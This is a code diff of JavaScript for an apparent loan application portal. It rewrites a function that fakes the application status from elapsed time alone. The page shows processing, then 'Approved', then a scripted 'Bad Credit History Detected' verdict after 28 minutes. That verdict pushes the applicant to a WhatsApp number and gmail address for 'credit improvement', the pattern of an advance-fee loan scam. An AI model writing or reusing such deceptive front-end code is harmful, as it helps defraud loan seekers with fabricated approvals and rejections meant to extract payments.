@@ -1276,86 +1276,91 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Function to update application status based on time
-    function updateApplicationStatus(data) {
-        const applicationTime = data.applicationTimestamp || new Date().getTime();
-        const currentTime = new Date().getTime();
-        const timeDiff = currentTime - applicationTime;
+    // Function to update application status based on time
+function updateApplicationStatus(data) {
+    const applicationTime = data.applicationTimestamp || new Date().getTime();
+    const currentTime = new Date().getTime();
+    const timeDiff = currentTime - applicationTime;
+    
+    const statusIndicator = document.getElementById('statusIndicator');
+    const statusText = document.getElementById('statusText');
+    const progressFill = document.getElementById('applicationProgress');
+    const progressPercentage = document.getElementById('progressPercentage');
+    
+    // 15 minutes in milliseconds
+    const fifteenMinutes = 15 * 60 * 1000;
+    // 28 minutes in milliseconds
+    const twentyEightMinutes = 28 * 60 * 1000;
+    // 32 minutes in milliseconds
+    const thirtyTwoMinutes = 32 * 60 * 1000;
+    
+    let progress = 0;
+    
+    if (timeDiff < fifteenMinutes) {
+        // First stage: Instant 65% with real-time updates
+        // Calculate progress from 65% to 97% based on time elapsed
+        progress = 65 + Math.min(Math.floor((timeDiff / fifteenMinutes) * 32), 32);
+        statusIndicator.className = 'status-indicator status-pending';
+        statusText.textContent = 'Application received and we are Processing';
         
-        const statusIndicator = document.getElementById('statusIndicator');
-        const statusText = document.getElementById('statusText');
-        const progressFill = document.getElementById('applicationProgress');
-        const progressPercentage = document.getElementById('progressPercentage');
+        // Update status every 30 seconds if in processing stage
+        setTimeout(function() {
+            updateApplicationStatus(data);
+        }, 30000);
+    } else if (timeDiff < twentyEightMinutes) {
+        // Second stage: 15-28 minutes: 98% "Your Loan Application has been Approved"
+        progress = 98;
+        statusIndicator.className = 'status-indicator status-approved';
+        statusText.textContent = 'Your Loan Application has been Approved';
         
-        // 15 minutes in milliseconds
-        const fifteenMinutes = 15 * 60 * 1000;
-        // 30 minutes in milliseconds
-        const thirtyMinutes = 30 * 60 * 1000;
-        
-        let progress = 0;
-        
-        if (timeDiff < fifteenMinutes) {
-            // Processing stage (0-15 minutes)
-            progress = Math.min(Math.floor((timeDiff / fifteenMinutes) * 100), 99);
-            statusIndicator.className = 'status-indicator status-pending';
-            statusText.textContent = 'Application Processing';
-            
-            // Update status every 30 seconds if in processing stage
+        // If just entered this stage, update after the remaining time to reach 28 minutes
+        const timeToNextStage = twentyEightMinutes - timeDiff;
+        if (timeToNextStage > 0) {
             setTimeout(function() {
                 updateApplicationStatus(data);
-            }, 30000);
-        } else if (timeDiff < thirtyMinutes) {
-            // Approved stage (15-30 minutes)
-            progress = 100;
-            statusIndicator.className = 'status-indicator status-approved';
-            statusText.textContent = 'Application Approved';
-            
-            // If just entered this stage, update after 15 minutes
-            if (timeDiff < fifteenMinutes + 1000) {
-                setTimeout(function() {
-                    updateApplicationStatus(data);
-                }, fifteenMinutes);
-            }
-        } else {
-            // Bad credit history stage (after 30 minutes)
-            progress = 100;
-            statusIndicator.className = 'status-indicator status-rejected';
-            statusText.textContent = 'Bad Credit History Detected';
-            
-            // Update the next steps card
-            const nextStepsCard = document.querySelector('#portal-section .card:last-child');
-            if (nextStepsCard) {
-                nextStepsCard.innerHTML = `
-                    <div class="card-title with-line">Credit Improvement Required</div>
-                    <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
-                    <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately to complete your credit improvement process:</p>
-                    <div class="contact-item">
-                        <div class="contact-icon">
-                            <i class="fab fa-whatsapp"></i>
-                        </div>
-                        <div class="contact-text">
-                            <strong>WhatsApp</strong>
-                            +27698480097
-                        </div>
-                    </div>
-                    <div class="contact-item">
-                        <div class="contact-icon">
-                            <i class="fas fa-envelope"></i>
-                        </div>
-                        <div class="contact-text">
-                            <strong>Email</strong>
-                            oysterfinanceltd@gmail.com
-                        </div>
-                    </div>
-                    <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
-                        <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
-                    </button>
-                `;
-            }
+            }, timeToNextStage + 1000); // Add 1 second buffer
         }
+    } else {
+        // Final stage: After 28-32 minutes: "Bad Credit History Detected"
+        progress = 100;
+        statusIndicator.className = 'status-indicator status-rejected';
+        statusText.textContent = 'Bad Credit History Detected';
         
-        progressFill.style.width = progress + '%';
-        progressPercentage.textContent = progress + '%';
+        // Update the next steps card with credit improvement message
+        const nextStepsCard = document.querySelector('#portal-section .card:last-child');
+        if (nextStepsCard) {
+            nextStepsCard.innerHTML = `
+                <div class="card-title with-line">Credit Improvement Required</div>
+                <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
+                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately to complete your credit improvement process:</p>
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="contact-text">
+                        <strong>WhatsApp</strong>
+                        +27698480097
+                    </div>
+                </div>
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <div class="contact-text">
+                        <strong>Email</strong>
+                        oysterfinanceltd@gmail.com
+                    </div>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
+                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
+                </button>
+            `;
+        }
     }
+    
+    progressFill.style.width = progress + '%';
+    progressPercentage.textContent = progress + '%';
+}
     
     // Function to create demo data for a new user
     function createDemoData(idNumber) {
